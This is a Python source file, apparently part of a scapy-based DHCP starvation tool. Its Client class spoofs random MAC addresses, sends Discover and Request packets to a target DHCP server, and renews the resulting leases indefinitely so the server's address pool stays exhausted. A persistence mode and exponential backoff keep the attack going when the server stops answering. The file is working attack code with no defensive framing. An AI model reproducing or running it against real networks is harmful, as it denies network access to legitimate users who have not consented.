import os
import sys
from random import randint
from threading import Thread
from time import sleep

from scapy.arch import str2mac
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff
from scapy.utils import mac2str
from scapy.volatile import RandMAC

OFFER = 2
ACK = 5

TIMEOUT = 5


class Client(Thread):
    iface = None
    target = None
    lock = None
    persist = False
    addresses = {}  # all the address we have
    time_for_sleep = 1

    def __init__(self):
        Thread.__init__(self)
        # generate random mac address
        self.ch_mac = mac2str(str(RandMAC()))
        self.mac = str2mac(self.ch_mac)
        self.transaction_id = randint(0, 0xffffffff)
        self.ip = None

    def run(self):
        """
        Discover -> Offer -> Request -> ACK
        According to RFC 2131 (DHCPv4),
        after receiving an ack packet the client should wait for 50% of the lease time before sending a new request.
        If the client does not receive a response from the server,
        the next request from the client should be after 88.5% of the lease time.
        """
        self.discover()
        offer_packet = self.sniffer(OFFER)

        self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address

        time_for_release = dict([ops for ops in offer_packet[DHCP].options if len(ops) == 2])['lease_time']

        self.request()
        ack_packet = self.sniffer(ACK)
        if not ack_packet:
            self.kill_client()

        # every loop we renew the same ip address
        while True:  # renew the lease infinite times
            time_for_release = dict([ops for ops in ack_packet[DHCP].options if len(ops) == 2])['lease_time']
            self.replace_ip(ack_packet[BOOTP].yiaddr)  # update the ip address

            sleep(time_for_release * 0.5)  # wait for 50% of the lease time
            self.request()
            ack_packet = self.sniffer(ACK)
            if ack_packet:  # receive ack packet successfully
                continue  # renew the lease
            else:  # not receiving ack
                sleep(time_for_release * (0.885 - 0.5))  # wait for 88.5% of the lease time
                self.request()
                ack_packet = self.sniffer(ACK)
                if not ack_packet:  # if not receive ack packet
                    self.kill_client()

    def sniffer(self, op):
        packets = sniff(
            count=1,
            iface=Client.iface,
            timeout=TIMEOUT,
            lfilter=lambda p:
            BOOTP in p and
            p[IP].src == Client.target and  # accept packets only from the target DHCP server
            p[BOOTP].xid == self.transaction_id and  # the packet is for the current client
            dict([ops for ops in p[DHCP].options if len(ops) == 2])['message-type'] == op,  # the packet type
        )

        if op == OFFER and len(packets) == 0:  # if timeout occurs for Offer
            if not Client.persist:
                # if not persistent the program terminated when the server is down
                Client.lock.acquire(blocking=True)  # catch the lock, stop creating new clients
                sleep(TIMEOUT * 3)  # wait for clients to finish their connections
                os._exit(0)  # terminate the program
            # all the threads that not receive answer while its lock are going to be killed
            elif Client.lock.acquire(blocking=True, timeout=TIMEOUT):
                # stop create clients, DHCP server is down
                print(f'========= LOCK Locked for {Client.time_for_sleep} seconds=========')
                sleep(Client.time_for_sleep)  # try again after time_for_sleep seconds (if real client disconnect)
                Client.time_for_sleep *= 2  # the time we sleep goes up exponentially
                Client.lock.release()
                print('========= LOCK Release =========')

            # close current thread
            self.kill_client()
        elif op == ACK and len(packets) == 0:
            return False
        else:  # successfully receive the packet
            print(f'{"A" if op == 5 else "O"}: 0x{self.transaction_id:08x}')
            return packets[0]

    def replace_ip(self, new_ip):
        """
        If we receive different ip, set self.ip and update the ips
        :param new_ip: the new ip address
        """
        if new_ip == self.ip:
            return
        if self.ip in Client.addresses:
            del Client.addresses[self.ip]
        self.ip = new_ip
        Client.addresses[new_ip] = self.mac

    def kill_client(self):
        """
        It deletes the client's IP address from the dictionary of addresses
         and exits the thread
        """
        if self.ip in Client.addresses:
            del Client.addresses[self.ip]
        sys.exit()

    def discover(self):
        print(f'D: 0x{self.transaction_id:08x}')
        packet = Ether(
            src=self.mac,
            dst='ff:ff:ff:ff:ff:ff'
        ) / IP(
            src='0.0.0.0', dst='255.255.255.255'
        ) / UDP(
            dport=67, sport=68
        ) / BOOTP(
            op=1, chaddr=self.ch_mac, xid=self.transaction_id
        ) / DHCP(
            options=[('message-type', 'discover'),
                     'end']
        )
        Thread(target=self.sleep_and_send, args=packet).start()

    @staticmethod
    def sleep_and_send(packet):
        sleep(0.1)
        sendp(packet, iface=Client.iface, verbose=0)

    def request(self):
        print(f'R: 0x{self.transaction_id:08x}')
        packet = Ether(
            src=self.mac,
            dst='ff:ff:ff:ff:ff:ff'
        ) / IP(
            src='0.0.0.0', dst='255.255.255.255'
        ) / UDP(
            dport=67, sport=68
        ) / BOOTP(
            op=3, chaddr=self.ch_mac, xid=self.transaction_id
        ) / DHCP(
            options=[('message-type', 'request'),
                     ('server_id', Client.target),
                     ('requested_addr', self.ip),
                     'end']
        )
        Thread(target=self.sleep_and_send, args=packet).start()

